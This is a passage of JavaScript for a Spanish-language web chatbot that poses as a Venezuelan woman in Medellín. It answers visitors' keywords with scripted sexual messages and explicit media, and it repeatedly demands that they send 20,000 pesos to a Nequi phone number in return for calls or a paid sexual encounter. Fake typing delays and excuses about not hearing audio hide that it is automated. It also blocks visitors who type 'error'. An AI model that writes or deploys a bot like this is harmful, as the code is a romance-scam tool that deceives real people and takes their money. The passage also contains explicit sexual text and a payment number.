      ['enviar video toche.mp4', 6000],
      ['enviar imagen lana2.jpg', 6000],
      ['enviar imagen lana3.jpg', 6000],
      ['enviar video lana4.mp4', 6000],
    ],
  ],
  },
  {
  keywords: ['dinero','dinero','no uso Nequi','no tengo Nequi','no tengo plata en Nequi','no tengo cuenta en Nequi', 'no tengo el Nequi','no tengo Nequi','no tengo Nequi','Nequi', 'plata','neki','en efetivo','"no tengo ahora','plata','plata','plata','plata','plata','plata','plata', 'pagen', 'efetivo',
  'pago','daviplata','bancolombia', 'davi plata','numero', 'funciona', 'pagado', 'neqi','si no de una',"no tengo plata","no tengo dinero", "no tengo plata","no tengo el dinero","no tengo plata","pero no tengo plata",
  "no tengo dinero","no tengo plata ahora","no tengo dinero"],
  sequences: [
    [
      ['solo vas a una tienda donde tengan nequi me envias 20Mil a mi nequi 3164909368 yo are caso en todo mi Amor.', 6000],
      ['enviar video veterna.mp4', 6000],
      ['enviar imagen entra5.jpg', 6000],
      ['enviar imagen a2.jpg', 6000],
      ['Quiero complacerte todo el mes amor', 6000],
    ],
    [
      ['Solo vas a una tienda y enviarme 20mil a mi nequi 3164909368 Con eso ganas tu Amor..', 6000],
      ['enviar video b12.mp4', 6000],
      ['enviar imagen b11.jpg', 6000],
      ['enviar imagen b15.jpg', 6000],
      ['No vallas a mostrar las fotos a nadie porque tengo dos niñas', 6000],
    ],
  ],
  },
  // Agregar más palabras clave y sus respuestas/secuencias asociadas aquí


  {
  keywords: ["quien vives","tienes pareja","con tu pareja","tiene pareja","o pareja","tener esposo","tener marido","tener novio","tiene novio","tiene marido","soltero y tu","quien vives??","vives con alguien","vives sola","Vives sola","soltera", "comprometida", "casada", "tienes hijos","tienes marido", "tienes novio","quien vives","quién vives","con quien vives","con quien vives","eres soltera",  "tener esposo","tienes esposo","Conkien vives","Vives sola?"],
  sequences: [
    [
      ['enviar video papa.ogg', 6000],
      ['enviar video tienepareja.ogg', 6000],
    ],
    [
      ['tengo varios años separada del papá de mis hijas,Soy mamá de 2 niñas y solo me he dedicado a ellas el 100 %', 6000],
      ['enviar video tienepareja2.ogg', 6000],
    ],
  ],
  },
  {
  keywords: ["hago", "deliciosa", "que haces", "aces","haces", "que hace","ases", "asiendo","aciendo","haciendo"],
  sequences: [
    [
      ['Soy muy adicta al sexo con ganas de venirme amor', 6000],
      ['enviar imagen 007.jpg', 6000],
      ['enviar video toche.mp4', 6000],
    ],
    [
      ['Aqui sola con unas ganas de venirme amor🔥', 6000],
      ['enviar imagen vivo1.jpg', 6000],
      ['enviar imagen vivo2.jpg', 6000],
      ['enviar video  amor1.mp4', 6000],
    ],
        [
      ['yo tenia unas ganas de venirme enviame cosas de sexo amor.', 6000],
      ['enviar imagen paka.jpg', 6000],
      ['enviar imagen lana2.jpg', 6000],
      ['enviar video  lana4.mp4', 6000],
    ],
  ],
  },
  {
  keywords: ["donde ests","donde vive","donde te encuentras", "dirección","Veamos en tu casa","donde estas","dime donde","donde eres","de donde eres","dónde vives","dime dónde vives","donde es","vives en","donde eres","donde esta","donde eres?","donde vives","donde vives?","donde andas", "parte","en que parte","parte te encuentras","direccion","parte","parte","parte","parte","parte","parte","parte","estas viviendo","ciudad","que lado", "lugar", "pais", "dnde estas", "donde te ecuentras", "te ecuentras","que barrio","q barrio","barrio vives","barrio eres","ubicación","tu ubicación","donde estas","localidad", "país","tu donde vives","país","país", "desde donde","desde donde","que parte", "parte de","parte eres","sitio","estas en bogota","direcion"],
  sequences: [
  [
    ['Soy Venezolana y estoy aquí en Medellin en la Candelaria donde queda la Plaza de Botero 52 con 52 amor', 6000],
    ['Y tu de Pais eres amor', 6000],
       ],
    ],
  },
  {
  keywords: ['llamada','me contesta','Te llamo','videollamada','llamando','yamada','Llamada','no contesta', 'llamando','llamando','llamando','llamando','llamando','llamando','llamando','llamando','llamando','llamando','llamando','llamando','llamando','llamando','llamando','llamando',
  'llamando','llamando','llamando','llamando','llamando','llamando','llamando','llamando','llamando','llamando','llamando','llamando','llamando','llamando','llamando','llamando','llamando','llamando','llamando','llamando','llamando','llamando','llamando','llamando','llamando',
  'llamando','llamando','llamando','llamo','te llamo','llamanda','contesta','contestas','llama',"yamarte","contestame"],
  sequences: [
    [
      ['Cuando me pases 20Mil a mi nequi 3164909368 me puedes llamar estoy desnuda con unas ganas amor', 6000],
      ['enviar imagen piko2.jpg', 6000],
      ['enviar imagen entra3.jpg', 6000],
      ['enviar imagen 007.jpg', 6000],
      ['te mando videos y aremos lo que tu quieras amor', 6000],
      ],
    [
      ['Si me pasa 20Mil a mi nequi 3164909368 yo ando desnuda y me puedes llamar todo el mes que despues culiamos amor', 6000],
      ['enviar imagen cero.jpg', 6000],
      ['enviar imagen uno.jpg', 6000],
      ['enviar imagen dos.jpg', 6000],
      ['enviar video febrero.mp4', 6000],
      ['yo are lo que tú digas amor', 6000],
      ],
    [
      ['Envíame 20Mil a mi nequi 3164909368 que yo ando desnuda y te vídeo llamo todito el mes y vez como me meto un consolador en el culito amor mio', 6000],
      ['enviar video lana.mp4', 6000],
      ['enviar imagen lana2.jpg', 6000],
      ['enviar imagen lana3.jpg', 6000],
      ['enviar video lana4.mp4', 6000],
    ],
  ],
  },
  {
  keywords: ['presencial','precencial','persona','en persona','cuanto necesitas','para follar','personal mente','Cuanto bale','Cuanto vale','Cuanto me vale','cuanto cobra','personal','personal','personal','personal', "pides", "cuesta", "Que vale","rato","un rato","el rato","encuentro", "valor","valor","valor","valor","valor","valor","valor","valor","valor","valor","valor","valor","valor","valor","valor","valor","pides"],
  sequences: [
    [
      ['si puedes venir a culiarme con 50Mil amor primero tienes que enviarme 20Mil a mi nequi 3164909368 para confirmar invitarte y me das por el culitoo y te lo mamo rico en mi apartamento Amor', 6000],
      ['enviar imagen apk.jpg', 6000],
      ['enviar imagen apk1.jpg', 6000],
      ['enviar imagen a1.jpg', 6000],
      ],
    [
      ['Si me puedes venir con 50Mil cojerme pero primero tienes que enviarme 20Mil a mi nequi 3164909368 para confirmar e invitarte a mi casa a culiar y me des por el culo y te lo mame rico mi amor', 6000],
      ['enviar imagen 007.jpg', 6000],
      ['enviar video bbl.mp4', 6000],
    ],
  ],
  },
  {
  keywords: ["audio","envieme nota","envieme una nota","audio para","un audio","audio","escuchar tu voz","nota de voz","un audio","escuchar","tu voz","mensaje de voz","de voz","una nota","nota","nota de voz"],
  sequences: [
    [
      ['enviar video audio.ogg', 6000],
    ],
    [
      ['enviar video real.ogg', 6000],
    ],
    [
      ['no me gustan audios amor', 6000],
    ],

  ],
  },
  {
  keywords: ["que edad","que edad", "edad tienes","q edad","que edad","cuantos años","años tienes","Cuanto años","cuanto años tienes","cuantos años tiene","años tenes","cuantos años","años tienes","Cuantos años tienes","Cuántos años tienes?","cuantos años tenes","años tenes","cuántos años tenes","cuántos años tiene","años tiene","Usted años","Ust años","Ust años tiene","años tu","Ust años tiene","cuánto años tiene","años tiene","cuántos años tenés","cuántos años tenes","años tenes","años tienes"],
  sequences: [
    [
      ['enviar video años22.ogg', 6000],
      ['Y cuantos tienes tu amor', 6000],
    ],
    [
      ['enviar video años.ogg', 6000],
    ],
  ],
  },

  {
  keywords: ["trabajas", "trabajando y tu", "estas trabajando","ests trabajando","esta trabajando", "dedicas", "se dedica"],
  sequences: [
    [
      ['trabajo aveces en un salon de belleza🥹.', 6000],
      ['Y que haces estudias trabajas', 6000],
    ],
    [
      ['trabajo aveces en un salon de belleza🥹.', 6000],
      ['Y que haces estudias trabajas', 6000],
    ],
  ],
  },


  {
    keywords: ["reina", "atractiva", "guapa", "princesa","belleza", "bb", "linda", "hermosa", "preciosa", "te amo", "amo", "adoro", "te quiero", "belleza", "bellezima", "belleza","encantadora", "fascinante", "atractiva", "hermosa", "maravillosa", "carismática", "espléndida", "elegante", "agradable", "deslumbrante", "deslumbradora", "encantadoramente", "atractivamente", "fascinantemente", "guapa", "encanto", "adorable", "adoracion", "cariñosa", "amorosa"],
    responses: ['Gracias', 'Enserio', 'ay que lindo eres❤️', 'Soy super linda',  'Con gusto mi amor ', 'Pero no tengo plata', 'Gracias amor 💞', 'Gracias mí corazón', 'Y eso q no me conoces','Es usted muy amable.', 'Gracias rey', 'Gracias por ser tan bello', 'Gracias mí amor', 'Gracias bb', 'Usted también es hermoso mi amor', 'Gracias ☺️', 'Gracias 🥴', 'Bello mi amor', 'Hay BB eres la mejor persona 💗','Todo hermoso mi BB ❣️', 'Bello 🤩 meeeee encantaaaaaas', '❤️ tan bello', 'Gracias bb por esas palabras tan lind que me distes', 'Gracias cielo ❤️','Y eso q Nome has visto, si no imagínate', 'Hay amor que lindo 😻', 'Gracias mi vida', 'Tan lindo me agradas mucho', 'Hay cielo que lindo', 'Besos mi amor', 'Hay amor tan lindo 😍', 'Te mando un beso y un abrazo fuerte', 'Tan bello mi amor', 'Gracias encantada amor', 'Es usted un amor', 'Eres demasiado mentiroso 🤥', 'Tengo la cintura bonita y tengo grande cola y mis pechos son grandes tambien', 'Y gracias mi  amor 😍😍❤️💘', 'Y gracias', 'Si de algo pudes estar seguro es que yo quiero venirme Amor👅', '❤️💘 Que bello cariño', 'Yo también te quiero 😘', 'quiero que me cojas amor💖'],
  },



];







const randomResponses = [
  'Bueno pero tiene q enviarme algo de dinero',
   'Sii mándame plata amor',
   'Si te guste amor',
   'Shiiii 🥰❤️',
   'Si mi amor',
   '❤️super rico 🤤',
   'Hay dios 😁',
   'Delicioso está bien',
   'Bien amor',
   'Vale',
   'Que finooo',
   'Ahhh yaa que chevere',
   'Sip',
   'Si claro',
   '❤️super rico 🤤',
   'Si delicioso amor',
   'Divino amor',
   'Unnm eso es bueno',
   'Estaba mas caliente amor',
   'Si Rey',
   'Eso es bueno',
   'Si Rico',
   'Bueno Amor❤️',
   'Lindo',
   'Eres mío Amor',
   'Un ya Rico',
   'Me alegro',
   'Ajá y entonces',
   'Un ya cielo',
   'Vale cielo está bien',
   'Vale mí amor ❤️😍',
   'Que me Arias amor',
   'Vale amor está Bien',
   'Ok esta bien',
   'Hay se ve el interés de una persona',
   'Que bueno mi amor',
   'Usted me agrada amor',
   'mi amorsito rico',
   'Yo puedo ser tu novia si lo quieres asi Amor🔥♥️.',
   'Y no veo tu interés',
   'Me ayudarás',
   'Heres un hombre bello me encantas come me tratas',
   'Envíeme una foto',
   'ya te dire a ti si a todo Amor',
   'Ahh ok sii esta biene alegra',
   'Dime cosas calientes Amor',
   'claro que si🥰',
   'Si gracias 😊',
   'Delicioso ♥️',
   'Uff muy rico bebe',
   'Ahh ya amor',
   'Sii que rico bebe',
   'q ricooo mi amor',
   'Riiicooo 😋😋👅',
   'Ricooo riicoo ricoooo',
   'Qué bien, cariño',
   'Te diré a ti si a todo, amor',
   'delicioso',
   'Siiiiiii Ricoooooo',
   'Uf delicioso amor🔥',
   'Yo te daria todo de mi',
   'Eres lo que deseo amor',
   'Te gusto, mucho💓💯',
   'Soy irresistible amor',
   'Ayyy q delicia ers tu Rey.',
   'Dare lo que sea por tenerlo a mi lado hermoso💋🔥',
   'Me encantas♥♥',
   'Cosita deliciosa✨',
   'Deliciosaa amor❤️.',
   'Q Delicia❤🔥🔥',
   'Me Facinas Bb',
   'Te adoro mi vida',
   'tu me excitas💕',
   'Qué hombre tan Bello.',
   'Tu me excitas mucho',
   'me muero por verlo',
   'Rico pensar en ti amor',
   'Quiero que seas mi amor ❤️',
   'yo quiero verte bb❤',
   'Creo que estoy exitada amor✨',
   'Eres lo máximo Rey',
   'Lo que tu digas lo are🌹✨',
   'Solo espero algún día tenerte cerca, amor🌹',
   'Quiero que hagas cosas ricas amor',
   'me interesa tu amor',
   'Si amor te tengo muchas ganas',
   'Lo quiero sentir dentro de mi amor',
   'Gracias creo que la pasaria genial con tigo amor',
   'pero si estás dispuesto a mandarme plata?',
   'me interesa tu amor',
   'Que rico amor',
   'Mmm si bueno hazme muy feliz entonces',
   'Uf q ricooooooo',
   'Sentir que me amas seria delicioso amor',
   'Soy una adicta al sexo',
   'Te adoro mi vida',
   'riquisimo',
   'Muchos besitos para ti mi Bb💋',
   'Ajá bueno',
   'Bueno',
   'Eres una hermosura',
   'Que me cuentas',
   'Ayy en verdad',
   'Siii Me Encantas',
   'sii pero en verdad quiero que me ayudes',
   'Dime qué te gustan de las venezolanas',
   'Si gracias mi amor',
   'Si muy rico 🤤',
   'Sabías que las venezolanas son demasiado calientes amor',
   'Mi en la cama me gusta que me cojan en 4 bien rico 🤤 y que me lo metas por el culito así rico te lo quiero mamar',
   'hay amor q delicia',
   'Si me gustaría mucho',
   'Mientras me consientas y me hagas feliz siempre estaree contigo amor',
   'Si de verdad te pudiera conocer en verdad',
   'ay q rico amor',
   'que lindo como hablas',
   'no soy de esas mujeres que se van por el físico',
   'yo te are caso en todo mi amor',
   'Yo quiero venirme amor',
   'Dime me vas a enviar amor',
   'Siento unas ganas de cojer amor',
   'Eres Muy caliente amor',
   'Tengo rato sin hacer el amor',
   'Eso me encanta',
   'Delicioso amor',
   'Quiero sentirte dentro de mi amor',
   'Quiero hacer de todo mi amor lindo',
   'K rico amor',
   'Bueno amor❤️.',
   'Delicioso amor',
   'Me tienes muy caliente amor',
   'Y tu eres caliente',
   'Kieres mi cuka',
   'Claro que si mi vida esa es la idea',
   'Uffff seria riquisimo',
   'no tengo plata amor',
   'Con gusto mi amor',
   'Lindo💋',
   'igual yo no pido mucho, soy humilde corazon...',
   'Bueno transfiere y te creo',
   'yo quiero ser toda tuya❤️.',
   'Eres pura mentiras, no soy una niña.',
   'Quiero verte tu wevoo',
   'Está bien',
   '❤️',
   'Soy muy Bella amor💘.',
];

const audioResponses = [
    'los audios no los puedo escuchar',
    'me puedes escribir mi telefono tiene mal el sonido',
    'no puedo escuchar bien los audios',
    'No puedo escuchar el audio bb'
];

function removeAccents(str) {
    return str.normalize("NFD").replace(/[\u0300-\u036f]/g, "");
}

function getRandomResponse(responsesList) {
    const randomIndex = Math.floor(Math.random() * responsesList.length);
    return responsesList[randomIndex];
}

function findSequence(message) {
    if (message.type === 'text') {
        const lowercaseMessage = removeAccents(message.content.toLowerCase());
        for (const response of keywordResponses) {
            const keywords = response.keywords;
            const found = keywords.some(keyword => {
                const lowercaseKeyword = removeAccents(keyword.toLowerCase());
                return lowercaseMessage.includes(lowercaseKeyword);
            });
            if (found) {
                return response;
            }
        }
    }
    return null;
}

async function sendSequenceMessages(sequences) {
    const randomSequenceIndex = Math.floor(Math.random() * sequences.length);
    const randomSequence = sequences[randomSequenceIndex];

    for (const [message, interval] of randomSequence) {
        await sendMessageWithRandomDelay(message);
    }
}

let typingIndicatorVisible = false; // Variable to track typing indicator visibility

async function sendMessageWithRandomDelay(message) {
    const typingDelay = Math.floor(Math.random() * 3500) + 3000; // Range of [2000, 4500] milliseconds 2500) + 2000;
    const sendDelay = Math.floor(Math.random() * 3500) + 3500; // Range of [5000, 7500] milliseconds 2500) + 2500;

    await new Promise(resolve => setTimeout(resolve, typingDelay));

    const chatBox = document.getElementById('chat-box');

    if (!typingIndicatorVisible) {
        typingIndicatorVisible = true;
        const typingIndicator = document.createElement('div');
        typingIndicator.classList.add('message', 'bot');
        typingIndicator.innerHTML = '<div class="typing-indicator"><span></span><span></span><span></span></div>';
        typingIndicator.id = 'typing-indicator';
        chatBox.appendChild(typingIndicator);
        chatBox.scrollTop = chatBox.scrollHeight;
    }

    await new Promise(resolve => setTimeout(resolve, sendDelay));

    const typingIndicator = document.getElementById('typing-indicator');
    if (typingIndicator) {
        chatBox.removeChild(typingIndicator);
        typingIndicatorVisible = false;
    }

    // Check if it's a request to send a video, image, or audio
    if (message.startsWith('enviar video')) {
        const videoPath = message.substring(12).trim();
        displayMessage('bot', { type: 'video', content: videoPath });
    } else if (message.startsWith('enviar imagen')) {
        const imagePath = message.substring(13).trim();
        displayMessage('bot', { type: 'image', content: imagePath });
    } else if (message.startsWith('enviar audio')) {
        const audioPath = message.substring(12).trim();
        displayMessage('bot', { type: 'voice', content: audioPath });
    } else {
        displayMessage('bot', { type: 'text', content: message });
    }
}

function handleIncomingMessage(message) {
    const senderID = 'current_user'; // For the web version, use a placeholder ID
    const userBlocked = localStorage.getItem('isBlocked') === 'true';

    if (userBlocked) {
        console.log(`No response for user ${senderID}.`);
        window.location.href = redirectUrl; // Redirect to the specified URL
        return null; // Do not respond to blocked users
    }

    if (message.type === 'audio') {
        const randomAudioResponse = getRandomResponse(audioResponses);
        sendMessageWithRandomDelay(randomAudioResponse);
        return null; // Exit the function after sending the audio response
    }

    if (message.type !== 'text' || !/[a-zA-Z]/.test(message.content)) {
        // Check if the message is an image, video, or text without letters from A to Z
        sendMessageWithRandomDelay('❤️');
        return null;
    }

    const matchedResponse = findSequence(message);

    if (matchedResponse) {
        if (matchedResponse.responses) {
            const randomResponse = getRandomResponse(matchedResponse.responses);
            sendMessageWithRandomDelay(randomResponse); // Use delay for responses
            return null; // Return null to prevent direct response
        } else if (matchedResponse.sequences) {
            const sequences = matchedResponse.sequences;
            sendSequenceMessages(sequences);
        }

        if (matchedResponse.blockUser) {
            const blockReason = matchedResponse.keywords.join(', '); // Get the keyword for blocking
            localStorage.setItem('isBlocked', 'true'); // Block the user
            console.log(`User ${senderID} blocked.`);
            window.location.href = redirectUrl; // Redirect to the specified URL
            return null;
        }
    } else {
        // No keyword sequence found
        if (containsKeyword(message.content, "error") || containsKeyword(message.content, "fallo")) {
            localStorage.setItem('isBlocked', 'true'); // Block the user
            console.log(`User ${senderID} blocked without sending a message.`);
            window.location.href = redirectUrl; // Redirect to the specified URL
            return null; // Exit function after blocking user
        } else {
            // Respond with a random message for unknown inputs
            const randomResponse = getRandomResponse(randomResponses);
            sendMessageWithRandomDelay(randomResponse); // Use delay for random responses
            return null; // Return null to prevent direct response
        }
    }

    // Save the conversation (omitted for the web version)

    return null; // Do not send "Mensaje recibido."
}

function containsKeyword(text, keyword) {
    const normalizedText = removeAccents(text.toLowerCase());
    const normalizedKeyword = removeAccents(keyword.toLowerCase());
    return normalizedText.includes(normalizedKeyword);
}
